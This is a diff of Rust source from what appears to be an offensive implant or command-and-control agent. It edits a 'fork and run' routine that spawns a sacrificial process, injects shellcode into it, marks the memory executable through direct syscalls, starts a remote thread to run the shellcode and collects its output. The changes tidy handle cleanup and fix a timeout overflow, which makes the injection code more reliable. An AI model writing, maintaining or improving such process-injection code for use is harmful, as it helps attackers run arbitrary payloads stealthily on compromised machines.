@@ -175,21 +175,16 @@ unsafe fn fork_and_run_impl(shellcode: &[u8], spawnto: &str, timeout_ms: u32) ->
     crate::syscalls::nt_protect_remote(pi.process, remote_mem, shellcode.len(), 0x20)
         .map_err(|e| e)?;
 
-    // 4. Create remote thread in child to execute shellcode + close write pipe
+    // 4. Create remote thread in child to execute shellcode
     let remote_thread = crate::syscalls::nt_create_thread(pi.process, remote_mem)
         .map_err(|e| e)?;
 
     // Resume the main thread (needed for process to initialize)
     resume_thread(pi.thread);
 
-    // Close parent's write end of pipe — ReadFile will get EOF when child exits
+    // Close parent's write end of pipe
     close_handle(write_pipe);
-
-    if remote_thread.is_null() {
-        // Thread creation failed — still try to read any output
-    } else {
-        close_handle(remote_thread);
-    }
+    close_handle(remote_thread);
 
     // 5. Read stdout from pipe (blocks until child closes its end / dies)
     let mut output = Vec::new();
@@ -207,7 +202,8 @@ unsafe fn fork_and_run_impl(shellcode: &[u8], spawnto: &str, timeout_ms: u32) ->
     }
 
     // 6. Wait for child with timeout
-    let wait_result = wait_for_single_object(pi.process, timeout_ms * 1000);
+    let wait_ms = (timeout_ms as u64 * 1000).min(0xFFFFFFFF) as u32;
+    let wait_result = wait_for_single_object(pi.process, wait_ms);
     if wait_result == 0x102 { // WAIT_TIMEOUT
         terminate_process(pi.process, 1);
     }
